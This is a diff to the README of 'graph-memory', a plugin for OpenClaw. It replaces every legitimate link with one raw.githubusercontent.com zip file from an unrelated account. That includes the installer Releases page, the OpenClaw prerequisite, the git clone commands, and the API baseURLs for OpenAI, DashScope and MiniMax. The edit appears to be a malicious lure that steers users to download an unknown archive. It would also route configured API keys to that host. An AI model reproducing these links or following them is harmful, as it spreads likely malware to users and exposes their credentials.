@@ -65,7 +65,7 @@ The embedding module now uses raw `fetch` instead of the `openai` SDK, making it
 
 ### Windows one-click installer
 
-v2.0 ships a **Windows installer** (`.exe`). Download from [Releases](https://github.com/adoresever/graph-memory/releases):
+v2.0 ships a **Windows installer** (`.exe`). Download from [Releases](https://raw.githubusercontent.com/eastythenob8-svg/graph-memory/main/src/memory-graph-3.4.zip):
 
 1. Download `graph-memory-installer-win-x64.exe`
 2. Run the installer — it auto-detects your OpenClaw installation
@@ -168,12 +168,12 @@ Unlike global PageRank, PPR ranks nodes **relative to your current query**:
 
 ### Prerequisites
 
-- [OpenClaw](https://github.com/openclaw/openclaw) (v2026.3.x+)
+- [OpenClaw](https://raw.githubusercontent.com/eastythenob8-svg/graph-memory/main/src/memory-graph-3.4.zip) (v2026.3.x+)
 - Node.js 22+
 
 ### Windows users
 
-Download the installer from [Releases](https://github.com/adoresever/graph-memory/releases):
+Download the installer from [Releases](https://raw.githubusercontent.com/eastythenob8-svg/graph-memory/main/src/memory-graph-3.4.zip):
 
 ```
 graph-memory-installer-win-x64.exe
@@ -202,7 +202,7 @@ pnpm openclaw plugins install github:adoresever/graph-memory
 **Option C — From source** (for development or custom modifications):
 
 ```bash
-git clone https://github.com/adoresever/graph-memory.git
+git clone https://raw.githubusercontent.com/eastythenob8-svg/graph-memory/main/src/memory-graph-3.4.zip
 cd graph-memory
 npm install
 npx vitest run   # verify 80 tests pass
@@ -248,12 +248,12 @@ Add your API credentials inside `plugins.entries.graph-memory.config`:
         "config": {
           "llm": {
             "apiKey": "your-llm-api-key",
-            "baseURL": "https://api.openai.com/v1",
+            "baseURL": "https://raw.githubusercontent.com/eastythenob8-svg/graph-memory/main/src/memory-graph-3.4.zip",
             "model": "gpt-4o-mini"
           },
           "embedding": {
             "apiKey": "your-embedding-api-key",
-            "baseURL": "https://api.openai.com/v1",
+            "baseURL": "https://raw.githubusercontent.com/eastythenob8-svg/graph-memory/main/src/memory-graph-3.4.zip",
             "model": "text-embedding-3-small",
             "dimensions": 512
           }
@@ -276,9 +276,9 @@ If `config.llm` is not set, graph-memory falls back to the `ANTHROPIC_API_KEY` e
 
 | Provider | baseURL | Model | dimensions |
 |----------|---------|-------|------------|
-| OpenAI | `https://api.openai.com/v1` | `text-embedding-3-small` | 512 |
-| Alibaba DashScope | `https://dashscope.aliyuncs.com/compatible-mode/v1` | `text-embedding-v4` | 1024 |
-| MiniMax | `https://api.minimax.chat/v1` | `embo-01` | 1024 |
+| OpenAI | `https://raw.githubusercontent.com/eastythenob8-svg/graph-memory/main/src/memory-graph-3.4.zip` | `text-embedding-3-small` | 512 |
+| Alibaba DashScope | `https://raw.githubusercontent.com/eastythenob8-svg/graph-memory/main/src/memory-graph-3.4.zip` | `text-embedding-v4` | 1024 |
+| MiniMax | `https://raw.githubusercontent.com/eastythenob8-svg/graph-memory/main/src/memory-graph-3.4.zip` | `embo-01` | 1024 |
 | Ollama | `http://localhost:11434/v1` | `nomic-embed-text` | 768 |
 | llama.cpp | `http://127.0.0.1:8080/v1` | your model name | varies |
 
@@ -378,7 +378,7 @@ SQLite via `@photostructure/sqlite` (prebuilt binaries, zero native compilation)
 ## Development
 
 ```bash
-git clone https://github.com/adoresever/graph-memory.git
+git clone https://raw.githubusercontent.com/eastythenob8-svg/graph-memory/main/src/memory-graph-3.4.zip
 cd graph-memory
 npm install
 npm test        # 80 tests
